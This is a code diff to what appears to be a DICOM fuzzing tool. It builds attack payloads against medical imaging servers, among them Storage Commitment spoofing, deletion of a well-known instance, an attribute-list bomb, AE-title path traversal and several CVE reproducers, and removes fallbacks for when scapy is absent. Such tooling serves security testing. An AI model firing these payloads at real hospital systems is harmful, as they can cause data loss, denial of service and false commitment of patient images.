-        if not SCAPY_AVAILABLE:
-            return cls._unavailable('mpps_nset_final_state_undefined_value')
         cmd = N_SET_RQ(
             requested_sop_class_uid=MPPS_SOP_CLASS_UID,
             message_id=4,
@@ -3446,10 +3314,8 @@ class DimseNAttacks:
     @classmethod
     def mpps_ncreate_duplicate_instance(cls) -> AttackResult:
         """Two N-CREATEs claiming the same Affected SOP Instance UID."""
-        if not SCAPY_AVAILABLE:
-            return cls._unavailable('mpps_ncreate_duplicate_instance')
         dataset = cls._mpps_dataset('IN PROGRESS')
-        assoc = _associate_rq_bytes('MPPSSCP', 'C-SCARE-FZ', MPPS_SOP_CLASS_UID)
+        assoc = raw_associate_rq('MPPSSCP', 'C-SCARE-FZ', MPPS_SOP_CLASS_UID)
         first = _n_pdata_bytes(N_CREATE_RQ(
             affected_sop_class_uid=MPPS_SOP_CLASS_UID, message_id=5,
             data_set_type=0x0102,
@@ -3458,7 +3324,7 @@ class DimseNAttacks:
             affected_sop_class_uid=MPPS_SOP_CLASS_UID, message_id=6,
             data_set_type=0x0102,
             affected_sop_instance_uid=cls._MPPS_INSTANCE), dataset)
-        steps = [assoc, first, second, _release_rq_bytes()]
+        steps = [assoc, first, second, raw_release_rq()]
         return AttackResult(
             name='dimse_n_mpps_ncreate_duplicate_instance',
             category='dimse_n',
@@ -3485,8 +3351,6 @@ class DimseNAttacks:
         success for objects it does not hold gives the SCU permission to
         delete its only copy.
         """
-        if not SCAPY_AVAILABLE:
-            return cls._unavailable('storage_commitment_naction_unstored_instances')
         ds = Dataset()
         ds = ds / Element(0x0008, 0x1195, 'UI', '1.2.826.0.1.3680043.10.543.701.1')
         ds = ds / Element(0x0008, 0x1199, 'SQ', b'')     # Referenced SOP Sequence
@@ -3520,8 +3384,6 @@ class DimseNAttacks:
     @classmethod
     def storage_commitment_naction_invalid_action_type(cls) -> AttackResult:
         """Commitment N-ACTION with an action type PS3.4 J does not define."""
-        if not SCAPY_AVAILABLE:
-            return cls._unavailable('storage_commitment_naction_invalid_action_type')
         cmd = N_ACTION_RQ(
             requested_sop_class_uid=STORAGE_COMMITMENT_SOP_CLASS_UID,
             message_id=8,
@@ -3555,8 +3417,6 @@ class DimseNAttacks:
         can be told that objects are safely committed by any peer that can
         reach its listening port.
         """
-        if not SCAPY_AVAILABLE:
-            return cls._unavailable('storage_commitment_unsolicited_event_report')
         ds = Dataset()
         ds = ds / Element(0x0008, 0x1195, 'UI', '1.2.826.0.1.3680043.10.543.701.2')
         ds = ds / Element(0x0008, 0x1199, 'SQ', b'')
@@ -3590,9 +3450,6 @@ class DimseNAttacks:
     @classmethod
     def storage_commitment_event_report_invalid_event_type(cls) -> AttackResult:
         """Commitment N-EVENT-REPORT with an event type outside PS3.4 J."""
-        if not SCAPY_AVAILABLE:
-            return cls._unavailable(
-                'storage_commitment_event_report_invalid_event_type')
         cmd = N_EVENT_REPORT_RQ(
             affected_sop_class_uid=STORAGE_COMMITMENT_SOP_CLASS_UID,
             message_id=10,
@@ -3629,8 +3486,6 @@ class DimseNAttacks:
         The question is whether the SCP bounds the list before allocating a
         result per requested attribute.
         """
-        if not SCAPY_AVAILABLE:
-            return cls._unavailable('n_get_attribute_list_bomb')
         cmd = N_GET_RQ(
             requested_sop_class_uid=MPPS_SOP_CLASS_UID,
             message_id=11,
@@ -3662,8 +3517,6 @@ class DimseNAttacks:
         deletable object; an SCP that routes it into a generic instance-delete
         path can lose the commitment service for every peer.
         """
-        if not SCAPY_AVAILABLE:
-            return cls._unavailable('n_delete_well_known_instance')
         cmd = N_DELETE_RQ(
             requested_sop_class_uid=STORAGE_COMMITMENT_SOP_CLASS_UID,
             message_id=12,
@@ -3684,18 +3537,6 @@ class DimseNAttacks:
                 'Storage Commitment', 'N-DELETE-RQ', steps=steps,
                 bug_class='well-known-instance-deletion',
                 target_sop_class=STORAGE_COMMITMENT_SOP_CLASS_UID),
-        )
-
-    @staticmethod
-    def _unavailable(name: str) -> AttackResult:
-        """Placeholder when scapy is absent - DIMSE-N needs the packet layer."""
-        return AttackResult(
-            name=f'dimse_n_{name}_unavailable',
-            category='dimse_n',
-            payload=b'\x04\x00\x00\x00\x00\x00',
-            description=f'{name} requires scapy for DIMSE-N command encoding',
-            expected_behavior='Install scapy to generate this payload',
-            metadata={'scapy_required': True, 'delivery': 'dicom-sequence'},
         )
 
     @classmethod
@@ -3844,8 +3685,8 @@ class CVEAttacks:
     def cve_2026_50254_storescp_association_leak() -> List[AttackResult]:
         """CVE-2026-50254: repeated crafted connection requests leak memory
         in storescp single-process mode."""
-        malformed_max_length = _item_bytes(0x51, b'')
-        payload = _associate_rq_bytes(
+        malformed_max_length = raw_item(0x51, b'')
+        payload = raw_associate_rq(
             'STORESCP',
             'C-SCARE-FZ',
             CT_IMAGE_STORAGE_SOP_CLASS_UID,
@@ -3881,9 +3722,9 @@ class CVEAttacks:
     def cve_2026_35505_association_request_leak() -> List[AttackResult]:
         """CVE-2026-35505: repeated crafted connection requests leak memory
         until a single-process service is killed."""
-        duplicate_max_length = _item_bytes(0x51, struct.pack('!I', 0))
-        duplicate_max_length += _item_bytes(0x51, struct.pack('!I', 0xFFFFFFFF))
-        payload = _associate_rq_bytes(
+        duplicate_max_length = raw_item(0x51, struct.pack('!I', 0))
+        duplicate_max_length += raw_item(0x51, struct.pack('!I', 0xFFFFFFFF))
+        payload = raw_associate_rq(
             'DCMQRSCP',
             'C-SCARE-FZ',
             VERIFICATION_SOP_CLASS_UID,
@@ -3923,13 +3764,13 @@ class CVEAttacks:
         identifier = identifier / Element(0x0008, 0x0050, 'SH', '')
         identifier = identifier / Element(0x0010, 0x0010, 'PN', '')
         identifier = identifier / Element(0x0010, 0x0020, 'LO', '')
-        assoc = _associate_rq_bytes(
+        assoc = raw_associate_rq(
             '../ORTHO',
             'C-SCARE-FZ',
             MODALITY_WORKLIST_FIND_SOP_CLASS_UID,
         )
         pdata = _cfind_pdata_bytes(identifier)
-        release = _release_rq_bytes()
+        release = raw_release_rq()
         metadata = _icsma_metadata(
             'CVE-2026-52868',
             'CWE-22',
@@ -3968,13 +3809,13 @@ class CVEAttacks:
         identifier = identifier / Element(0x0008, 0x0060, 'CS', 'CT')
         identifier = identifier / Element(0x0010, 0x0010, 'PN', '*')
         identifier = identifier / Element(0x0040, 0x0100, 'LO', 'not-a-sequence')
-        assoc = _associate_rq_bytes(
+        assoc = raw_associate_rq(
             'WORKLIST',
             'C-SCARE-FZ',
             MODALITY_WORKLIST_FIND_SOP_CLASS_UID,
         )
         pdata = _cfind_pdata_bytes(identifier, message_id=2)
-        release = _release_rq_bytes()
+        release = raw_release_rq()
         metadata = _icsma_metadata(
             'CVE-2026-44628',
             'CWE-843',
@@ -5014,12 +4855,9 @@ class CVEAttacks:
 
         # PDU whose declared length vastly exceeds the bytes that follow — the
         # DUL reader may copy past the receive buffer.
-        if not SCAPY_AVAILABLE:
-            payload = b'\x01\x00' + struct.pack('!I', 0x7FFFFFFF) + b'X' * 64
-        else:
-            pkt = DICOM(length=0x7FFFFFFF) / A_ASSOCIATE_RQ(
-                called_ae_title='TARGET', calling_ae_title='ATTACKER')
-            payload = raw(pkt)
+        pkt = DICOM(length=0x7FFFFFFF) / A_ASSOCIATE_RQ(
+            called_ae_title='TARGET', calling_ae_title='ATTACKER')
+        payload = raw(pkt)
         results.append(AttackResult(
             name='cve_2015_8979_02_oversized_pdu_length',
             category='cve',
@@ -5724,14 +5562,8 @@ class ProtocolSeedGenerator:
         """Yield fuzzed A-ASSOCIATE-RQ payloads."""
         for i in range(count):
             try:
-                if SCAPY_AVAILABLE:
-                    pdu_bytes = raw(fuzz(DICOM() / A_ASSOCIATE_RQ()))
-                    mutation = 'scapy_fuzz'
-                else:
-                    pdu_bytes = ProtocolAttacks.malformed_protocol_version(
-                        random.randint(0, 0xFFFF)
-                    ).payload
-                    mutation = 'protocol_version'
+                pdu_bytes = raw(fuzz(DICOM() / A_ASSOCIATE_RQ()))
+                mutation = 'scapy_fuzz'
 
                 yield AttackResult(
                     name=f'fuzz_assoc_{i}',
@@ -5760,17 +5592,6 @@ class ProtocolSeedGenerator:
 
         for i in range(count):
             try:
-                if not SCAPY_AVAILABLE:
-                    yield AttackResult(
-                        name=f'fuzz_cstore_{i}',
-                        category='fuzzer',
-                        payload=b'',
-                        description='Scapy not available',
-                        expected_behavior='N/A',
-                        success=False,
-                    )
-                    continue
-
                 if i % 5 == 0:
                     cmd = C_STORE_RQ(
                         command_group_length=random.choice([0, 10, 0xFFFF, 0xFFFFFFFF]),
